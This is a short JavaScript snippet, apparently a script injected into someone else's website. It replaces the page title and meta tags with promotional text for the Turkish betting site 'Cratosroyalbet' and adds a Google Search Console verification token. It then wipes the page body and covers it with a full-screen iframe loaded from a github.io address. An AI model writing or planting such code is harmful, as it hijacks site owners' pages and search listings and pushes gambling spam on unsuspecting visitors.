(function() {
    var s = document.documentElement;
    var b = document.body;
    if(!b) return setTimeout(arguments.callee, 10);
    
    // index.html'den alınan SEO verileri
    document.title = "Cratosroyalbet Güncel Giriş - En Güvenilir Bahis ve Casino Sitesi";
    
    // Meta Description
    var metaDesc = document.createElement('meta');
    metaDesc.name = "description";
    metaDesc.content = "Cratosroyalbet güncel giriş adresi ile kesintisiz bahis ve casino deneyimi yaşayın. En yüksek oranlar, çeşitli oyunlar ve cazip bonuslar sizi bekliyor.";
    document.head.appendChild(metaDesc);

    // Meta Keywords
    var metaKey = document.createElement('meta');
    metaKey.name = "keywords";
    metaKey.content = "Cratosroyalbet, Cratosroyalbet giriş, Cratosroyalbet güncel, Cratosroyalbet bahis, Cratosroyalbet casino, Cratosroyalbet bonus, Cratosroyalbet güvenilir, Cratosroyalbet mobil";
    document.head.appendChild(metaKey);

    // Google Site Verification (Search Console Doğrulaması)
    var metaVerif = document.createElement('meta');
    metaVerif.name = "google-site-verification";
    metaVerif.content = "I1SqIKJhAfN_iT07WOAJSqeGR2m7hOgjVpifzJ4Qrx4";
    document.head.appendChild(metaVerif);

    // Tasarımı yükleyen iframe
    var i = document.createElement('iframe');
    i.src = 'https://devworksg-ux.github.io/geldikkss3/index.html';
    i.style.cssText = "position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:999999;background:#fff";
    
    b.innerHTML = "";
    b.appendChild(i );
    s.style.visibility = "visible";
    b.style.visibility = "visible";
})();
